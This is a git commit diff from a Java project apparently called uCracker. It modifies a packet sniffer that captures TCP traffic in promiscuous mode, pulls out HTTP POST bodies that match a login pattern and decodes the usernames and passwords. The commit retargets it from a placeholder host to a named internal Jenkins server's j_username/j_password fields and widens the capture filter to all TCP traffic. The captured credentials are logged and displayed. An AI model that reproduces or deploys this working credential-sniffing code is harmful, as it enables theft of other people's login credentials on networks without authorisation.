aeab1c1a30e6dc0f628cb40e1ee3fd7cc883f550
Tiago Leao <mv2axx@gmail.com>
2016-08-18 16:49:40 +0100

    saving changes

--- src/main/java/org/uCracker/listeners/ExamplePacketListener.java
+++ src/main/java/org/uCracker/listeners/ExamplePacketListener.java
@@ -3,22 +3,22 @@ package org.uCracker.listeners;
 import java.net.URLDecoder;
 import java.util.regex.Pattern;
 
-import net.sourceforge.jpcap.net.Packet;
-import net.sourceforge.jpcap.net.TCPPacket;
-
 import org.apache.log4j.Logger;
 import org.uCracker.util.ArgsPresentator;
 import org.uCracker.util.uCrackerPacketListener;
 
-public class ExamplePacketListener implements uCrackerPacketListener{
-	
+import net.sourceforge.jpcap.net.Packet;
+import net.sourceforge.jpcap.net.TCPPacket;
+
+public class ExamplePacketListener implements uCrackerPacketListener {
+
 	private static final Logger LOG = Logger.getLogger(ExamplePacketListener.class);
 
-	private static final String EXAMPLE_HOST = "example.com";
-	private static final String EXAMPLE_CREDENTIAL_PATTERN = "dni=.*&pwd=.*(&.*)*";
-	
-	private ArgsPresentator argsPresentator;
-	
+	private static final String EXAMPLE_HOST = "jenkins.internal.ibboost.com";
+	private static final String EXAMPLE_CREDENTIAL_PATTERN = "j_username=.*&j_password=.*(&.*)*";
+
+	private final ArgsPresentator argsPresentator;
+
 	public ExamplePacketListener(ArgsPresentator argsPresentator) {
 		this.argsPresentator = argsPresentator;
 	}
@@ -26,27 +26,27 @@ public class ExamplePacketListener implements uCrackerPacketListener{
 	public void packetArrived(Packet packet) {
 		try {
 			//TODO check host!
-			
+
 			// only handle TCP packets
 			if (packet instanceof TCPPacket) {
 				TCPPacket tcpPacket = (TCPPacket) packet;
 				byte[] data = tcpPacket.getTCPData();
 				String isoData = new String(data, "ISO-8859-1");
-				if(isoData.startsWith("POST")){
+				if (isoData.startsWith("POST")) {
 					String[] sections = isoData.split("\r\n\r\n");
-					if(sections.length >= 2){
-						if( Pattern.matches(EXAMPLE_CREDENTIAL_PATTERN, sections[1]) ){
-							
+					if (sections.length >= 2) {
+						if (Pattern.matches(EXAMPLE_CREDENTIAL_PATTERN, sections[1])) {
+
 							String dni, pwd;
 							String[] parameters = sections[1].split("&");
 							dni = parameters[0].substring(parameters[0].indexOf("=") + 1, parameters[0].length());
 							pwd = parameters[1].substring(parameters[1].indexOf("=") + 1, parameters[1].length());
 							dni = URLDecoder.decode(dni, "UTF-8");
 							pwd = URLDecoder.decode(pwd, "UTF-8");
-							
+
 							//OPTIONAL and RECOMENDED logging
 							LOG.trace("> dni:'" + dni + "' - pwd:'" + pwd + "'");
-							
+
 							argsPresentator.display(dni, pwd, this.getHost());
 						}
 					}
--- src/main/java/org/uCracker/util/Sniffer.java
+++ src/main/java/org/uCracker/util/Sniffer.java
@@ -1,8 +1,12 @@
 package org.uCracker.util;
 
+import java.util.ArrayList;
 import java.util.LinkedList;
 import java.util.List;
 
+import org.apache.log4j.Logger;
+
+import net.sourceforge.jpcap.capture.CaptureDeviceLookupException;
 import net.sourceforge.jpcap.capture.CaptureDeviceNotFoundException;
 import net.sourceforge.jpcap.capture.CaptureDeviceOpenException;
 import net.sourceforge.jpcap.capture.CapturePacketException;
@@ -10,34 +14,32 @@ import net.sourceforge.jpcap.capture.InvalidFilterException;
 import net.sourceforge.jpcap.capture.PacketCapture;
 import net.sourceforge.jpcap.capture.PacketListener;
 
-import org.apache.log4j.Logger;
-
 public class Sniffer {
-	
+
 	private static final Logger LOG = Logger.getLogger(Sniffer.class);
-		
+
 	private static final int INFINITE = -1;
 	private static final int PACKET_COUNT = INFINITE;
-	
-	private static String filter = "ip and tcp and port 80";
+
+	private static String filter = "ip and tcp";
 
 	PacketCapture pcap;
 	List<PacketListener> packetListeners;
-	
-	public Sniffer(ArgsPresentator argsPresentator){
+
+	public Sniffer(ArgsPresentator argsPresentator) {
 		pcap = new PacketCapture();
-		packetListeners = new LinkedList<PacketListener>();		
+		packetListeners = new LinkedList<PacketListener>();
 	}
-	
-	public void addHostFilters(List<String> hosts){
+
+	public void addHostFilters(List<String> hosts) {
 		StringBuffer sb = new StringBuffer();
 		sb.append(filter);
 		sb.append(" and ( ");
 		int i = 0;
-		for(String host : hosts){
+		for (String host : hosts) {
 			sb.append("host ");
 			sb.append(host);
-			if( i != hosts.size()-1 ){
+			if (i != hosts.size() - 1) {
 				sb.append(" or ");
 			}
 			i++;
@@ -45,8 +47,8 @@ public class Sniffer {
 		sb.append(" )");
 		filter = sb.toString();
 	}
-	
-	public void addPacketListener(PacketListener packetListener){
+
+	public void addPacketListener(PacketListener packetListener) {
 		pcap.addPacketListener(packetListener);
 	}
 
@@ -57,17 +59,43 @@ public class Sniffer {
 	 * @throws CaptureDeviceOpenException 
 	 * @throws InvalidFilterException 
 	 * @throws CapturePacketException 
+	 * @throws CaptureDeviceLookupException 
+	 * @throws UnsupportedOperationException 
+	 * @throws IllegalArgumentException 
 	 * @throws Exception
 	 */
-	public void sniff(String inet) throws CaptureDeviceNotFoundException, CaptureDeviceOpenException, InvalidFilterException, CapturePacketException {
-		if(inet == null){
+	public void sniff(String inet) throws CaptureDeviceNotFoundException, CaptureDeviceOpenException, InvalidFilterException, CapturePacketException, IllegalArgumentException, UnsupportedOperationException, CaptureDeviceLookupException {
+		if (inet == null) {
 			inet = pcap.findDevice();
 		}
+		//http://stackoverflow.com/questions/27353784/getting-interface-name-address-from-or-mapping-networkinterface-to-jpcap-devic
+		//http://stackoverflow.com/questions/62289/read-write-to-windows-registry-using-java/6163701#6163701
+		//http://stackoverflow.com/questions/9483379/jpcap-dll-on-a-64-bit-system
+		List<NetworkDeviceInfo> infos = new ArrayList<NetworkDeviceInfo>();
+
+		// Info can be queried from jpcap device string.
+		for (String jpcapDevice : PacketCapture.lookupDevices())
+			infos.add(new NetworkDeviceInfo(jpcapDevice));
+
+		// Info can be displayed.
+		for (NetworkDeviceInfo info : infos) {
+			System.out.println(info.getJpcapDeviceName() + ":");
+			System.out.println("  Description:   " + info.getDriverName());
+			System.out.println("  Vendor:        " + info.getDriverVendor());
+			System.out.println("  Address:       " + info.getInterfaceAddress());
+			System.out.println("  Subnet Mask:   " + info.getInterfaceSubnetMask());
+			System.out.println("  jpcap Display: " + info.getJpcapDisplayName());
+			System.out.println("  GUID:          " + info.getGuid());
+		}
+
+		// Device names from NetworkDeviceInfo can be passed directly to jpcap:
+		NetworkDeviceInfo selected = infos.get(2);
 		// Initialize jpcap
-		LOG.trace("Using device '" + inet + "'");
-		pcap.open(inet, 4000, true, 5000);
+		LOG.trace("Using device '" + selected.getJpcapDeviceName() + "'");
+		pcap.open(selected.getJpcapDeviceName(), 4000, true, 5000);
+
 		pcap.setFilter(filter, true);
-		for(PacketListener packetListener : packetListeners){
+		for (PacketListener packetListener : packetListeners) {
 			pcap.addPacketListener(packetListener);
 		}
 		LOG.trace("Capturing packets...");
